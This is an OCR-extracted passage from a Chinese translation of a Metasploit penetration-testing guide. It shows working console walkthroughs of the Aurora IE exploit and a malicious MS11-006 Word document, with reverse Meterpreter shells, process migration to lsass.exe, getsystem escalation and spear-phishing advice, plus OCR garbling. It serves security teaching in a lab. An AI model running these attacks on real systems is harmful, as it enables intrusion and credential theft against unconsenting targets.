接口上。参数SRVPORT?的默认值是8080，这个端口是目标用户将要连接的端口，来触发相
应的渗透攻击，我们使用80端口来代替8080。我们同样可以将Web服务器设置为支持SSL，
但是在这个例子中，我们还是使用标准的HTTP协议。参数URIPATH③是用户需要访问并触发
漏洞的URL地址，我们将其设为斜杠/。
我们的设置完成之后，可以用WindowsXP虚拟机来访问http://去连接
攻击者构造的网站。你会看到虚拟机变得有些迟钝，在些许等待之后，你将会在上述设定的监
听主机上得到一个Meterpreter shell，如下所示。在浏览器后台，堆喷射攻击已经执行，跳转去
执行某个动态内存地址处的指令，并最终命中了你布置其中的shellcode。如果你在渗透攻击之
前打开Windows的任务管理器进行查看，你将会发现iexplore.exe进程由于使用了许多堆内存
空间，而使得其占用的内存数量显著增长。
msf exploit(ms10_002_aurora)>
[*]Sending InternetExplorer"Aurora"Memory Corruption toclient 192.168.33.130
[*]Sending stage (748032 bytes)
[*]Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1161)
msf exploit(ms10_002_aurora)>sessions-i 1
[*]Starting interaction with 1...
meterpreter>
在得到一个Meterpretershell之后，你还会遇到一个小问题。如果目标用户在感觉到电脑变
迟钝的时候关闭浏览器意味着什么？这将会使你失去已经与目标主机建立起的控制会话，即使
前面的渗透攻击成功，也会导致连接过早地被中断。幸运的是，这个问题有个缓解的方法：控
制连接一旦建立成功，马上运行命令runmigrate，如下所示。这个包含在Meterpreter中的脚本
将会自动地将shell迁移到一个新的独立进程内存空间中，而这个新进程一般命名为Isass.exe。
如果目标用户关闭了最初被渗透攻击的进程，那么这样做的话将可能会保持住shell连接。
117
---
## Page 145
Metasploit渗透测试指南
meterpreter>run migrate
[*] Current server process: IEXPLORE.EXE (2120)
[*]Migrating to lsass.exe...
[*] Migrating into process ID 680
[*] New server process: lsass.exe (68o)
meterpreter>
这里演示的是一个纯手动迁移的过程。当然你还可以通过使用模块中的高级选项来对这个
过程进行自动化，将控制连接自动地迁移到另外的进程中。输入showadvanced命令可以列出
极光模块中的高级属性，如下所示：
msf exploit(ms10_002_aurora)> show advanced
Module advancedoptions:
Name
:ContextInformationFile
Current Setting:
Description
:The informationfilethatcontains contextinformation
Name
:DisablePayloadHandler
Current Setting: false
Description
:Disable the handler code for the selected payload
Name
:EnableContextEncoding
Current Setting:false
Description
:Use transient contextwhen encoding payloads
Name
：WORKSPACE
Current Setting:
Description
:Specify the workspace for this module
Payload advanced options (windows/meterpreter/reverse_tcp):
Name
:AutoLoadStdapi
Current Setting: true
Description
:Automaticallyload theStdapiextension
Name
:AutoRunScript
Current Setting:
Description
:A script torunautomatically on session creation.
Name
:AutoSystemInfo
Current Setting: true
Description
: Automatically capture system information on initialization.
Name
:InitialAutoRunScript
Current Setting:
Description
Name
:ReverseConnectRetries
Current Setting:5
Description
:Thenumber ofconnectionattemptstotrybeforeexitingtheprocess
118
---
## Page 146
第8章客户端渗透攻击
Name
:WORKSPACE
Current Setting:
Description:Specifytheworkspaceforthismodule
msfexploit(ms10_002_aurora）>
通过设定这些选项，我们可以对攻击载荷及渗透攻击模块的配置做些细微的调整。比如，
我们想要改变一个反弹式连接每次尝试连接的次数。如果你担心超时，可以将默认尝试连接的
次数从5改成10，如下所示：
msfexploit(ms10_002_aurora)>set ReverseConnectRetries 10
在这个案例中，为了防止目标用户迅速地关掉浏览器，你要自动化地将控制连接迁移到一
建时马上自动运行一个脚本，通过-f开关来运行migrate命令，可以使得Meterpreter自动运行
一个新进程，并将自身迁移至该进程中：
msfexploit(ms10_002_aurora)>set AutoRunScript migrate-f
现在你可以尝试重新运行渗透攻击，然后看看有什么变化。可以尝试关闭连接来看看你的
Meterpreter会话是否还依然活跃。
由于这是一个基于浏览器的渗透攻击，你最后极有可能取得运行在受限用户账户下的控制
连接。记得用usepriv和getsystem命令来尝试在目标主机上进行提权。
到此为止，你已经通过一个著名漏洞的利用，来成功实现了自己的第一次客户端渗透攻击！
必须注意的是，新的渗透攻击代码层出不穷，你必须根据特定的目标系统来选择一个最合适的
浏览器漏洞来进行渗透。
8.4文件格式漏洞渗透攻击
有些应用程序存在由输入文件格式类型bug所导致的可被利用的安全漏洞，比如Adobe
PDF。这类渗透攻击在用户使用存在漏洞的应用程序打开恶意文件时触发。而恶意文件可能是
通过远程下载浏览，或是直接通过邮件发送给用户。在这章的开头，我们已经提到了利用文件
格式漏洞渗透攻击进行针对性钓鱼攻击的场景，而对于这类攻击的详细介绍放在第10章介绍。
在一次文件格式漏洞渗透攻击中，你可以借助于任何类型可以感染目标主机的文件。这些
文件可以是一个微软的Word文档、一个PDF文件、"个图片，或者其他任何合适文件类型。
在这个例子中，我们利用的安全漏洞编号是MS11-006，是在微软Windows系统函数
这个渗透攻击模块，然后输入info命令查看可用的选项，如下所示。在接下来的演示中，我们
119
---
## Page 147
Metasploit渗透测试指南
还能看到输出文件的格式是doc文档。
msf>usewindows/fileformat/ms11_oo6_createsizeddibsection
msf exploit(ms11_o06_createsizeddibsection)>info
...SNIP...
Available targets:
IdName
==
0
Automatic
1
Windows 2000 SPo/SP4English
2
Windows XP SP3 English
3
Crash Target for Debugging
接下来，还能看到一些可以被渗透攻击的目标系统版本类型可供选择，我们选择自动匹配，
并将所有选项设为默认设置，如下所示：
Basic options:
Name
Current Setting
Required Description
FILENAME
msf.doc
yes
The file name.
OUTPUTPATH
1/opt/metasploit3/msf3/data/exploitsyes
Thelocation of thefile.
我们还将像以往一样设置一个攻击载荷。在这里，我们首选反弹式的meterpretershell，
如下：
msf exploit(ms11_o06_createsizeddibsection)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms11_006_createsizeddibsection)>set LH0ST 172.16.32.128
LHOST => 172.16.32.128
smsf exploit(ms11_006_createsizeddibsection)>setLPoRT443
LPORT=> 443
msfexploit(ms11_o06_createsizeddibsection)>exploit
[*]Creating‘msf.doc'file...0
[*]Generated output file /opt/metasploit3/msf3/data/exploits/msf.doc@
msf exploit(ms11_006_createsizeddibsection)>
8.5发送攻击负载
我们的输出文件是msf.docO，Metasploit将其生成到路径/opt/·下。现在，我们已经有了一
用程序的补丁和安全漏洞情况。当我们在实际打开这个文档之前，必须在模块中先建立-个多
线程监听端，如下所示。这样的话可以保证渗透攻击发生时，攻击主机可以收到来自目标主机
的连接请求（一个反弹式载荷）。
120
---
## Page 148
第8章客户端渗透攻击
msf exploit(ms11_o06_createsizeddibsection) > use multi/handler
payload=>windows/meterpreter/reverse_tcp
msf exploit(handler)>set LH0ST 172.16.32.128
LHOST=> 172.16.32.128
msf exploit(handler)>set LPoRT 443
LPORT => 443
msf exploit(handler)>exploit-j
[*]Exploitrunning as background job.
[*]Started reverse handler on 172.16.32.128:443
[*] Starting the payload handler...
msfexploit(handler)>
我们在一个WindowsXP虚拟机中打开该文档，将会得到一个shell（虚拟机的系统是
WindowsXPSP3），如下：
msf exploit(handler)>
[*] Sending stage (749056 bytes） to 172.16.32.131
[*] Meterpreter session 1 opened (172.16.32.128:443 -> 172.16.32.131:2718) at
Sun Apr 03 21:39:58-0400 2011
msf exploit(handler)>sessions -i 1
[*]Starting interaction with 1...
meterpreter>
通过使用Metasploit，我们成功地利用了一个文件格式类型的安全漏洞，制作了一个恶意文
档并且发送给我们的目标用户。回顾这个渗透攻击过程，如果事先对目标用户有一个充分的侦
查，我们将能够构造出看上去十分可信的邮件，而这个渗透攻击只是Metasploit平台上存在的
许多可用例子之一。
8.6小结
在本章中，我们阐述了攻击者如何操纵堆内存来实施客户端渗透攻击，我们也演示了空指
令在这次攻击中的作用，以及调试器的基本用法。你将会在第14章和第15章进一步学习调试
器的用法。MS11-006是一个栈溢出安全漏洞，我们将在随后章节中进一步地讨论栈溢出攻击技
术。值得注意的是，你进行这些渗透攻击的成功概率取决于在攻击之前了解多少关于目标的
信息。
作为一个渗透测试者，你应该学会利用每一点信息来让渗透攻击更加有效。比如在针对性
钓鱼攻击中，如果你能说一些公司内部的行话，然后对一些不了解计算机技术的小型业务部门
实施攻击，那么你成功渗透的可能性将大大增加。利用浏览器漏洞和文件格式漏洞的渗透攻击
是一个非常有效的领域，你需要更多的相关实践才能有更好的理解与掌握，我们将会在第9章
和第10章中继续讨论这方面的细节。
121
---
## Page 149
PDG
---
## Page 150
第
章
Metasploit辅助模块
大部分人一提起Metasploit，脑子里就会联想到它众多的渗透攻击模块。渗透攻击很酷，渗
透攻击能让我们得到远程系统控制权，所有的聚光灯都打到了渗透攻击模块上。但有时候仅有
渗透攻击模块是不够的，你还需要一些其他的东西。根据定义，Metasploit中“不是渗透攻击的
模块”被称作辅助模块（auxiliarymodule），这个模糊的定义给我们留下了很多的想象空间。①
除了提供一些实用的侦察工具，如端口扫描器、服务指纹搜取器（fingerprinters）等，辅助
SSH服务进行暴力口令猜解。此外还有一些协议Fuzz测试工具，如ftp_pre_post、
http_get_uri_long、smtp_fuzzer、ssh_version_corrupt等等。你可以对一些特定的目标服务执行这
些Fuzz测试器，并很有可能会有一些意外收获。
辅助模块不使用攻击载荷，但不要因此就觉得它们用处不大。在我们开始研究辅助模块数
不清的功能用途之前，先来看看它们到底是些什么东西。
①译者注：最新发的布Metasploitv4.0版本中增加了后渗透攻击模块，用于渗透攻击控制目标系统后的
进一步攻击行为；而大部分辅助模块功能集中为信息搜集环节提供支持。
---
## Page 151
Metasploit渗透测试指南
0root@bt:/opt/framework3/msf3/modules/auxiliary#1s-1
total52
drwxI-xr-x 23 r0ot root 4096 Apr 10 03:22 admin
drwxr-xr-x4r0ot root 4096Dec 1403:25 client
drwxr-xr-x 16 root root 4096 Jan1 04:19 dos
drwxr-xr-x8rootroot 4096Dec 14 03:25fuzzers
drwxr-xr-x 3 root root 4096 May 2 15:38 gather
drwxr-xr-x4root r0ot 4096Dec 14 03:25pdf
drwxr-xr-x36root root 4096Apr 1003:22 scanner
drwxr-xr-x 5 root root 4096 May 2 15:38 server
drwxr-xr-x3rootroot4096May215:38test
drwxr-xr-x3 root root 4096May2 15:38voip
在上面的列表中你会看到，这些模块安装在Metasploit的/modules/auxiliary目录①中，它
们的名字按照自身提供的功能进行分类。如果出于特定的目的，你需要创建自己的模块或对
现有的模块进行编辑，就可以在相应的目录中放置或是找到它们。举个例子，如果你需要开
发一个Fuzz测试模块，按照你的意图查找漏洞，你可以在/fuzzer目录中找到一些现有模块作
为参考。
可以在MSF终端中输入showauxiliary命令O列出所有可用的辅助模块。如果你把在MSF
终端中显示的模块名称和目录中的文件名进行比较，你会发现模块名称是依赖于底层目录结构
的，如下所示：
0 msf > show auxiliary
Auxiliary
Name
Rank
Description
admin/backupexec/dump
Veritas Backup Exec Windows Remote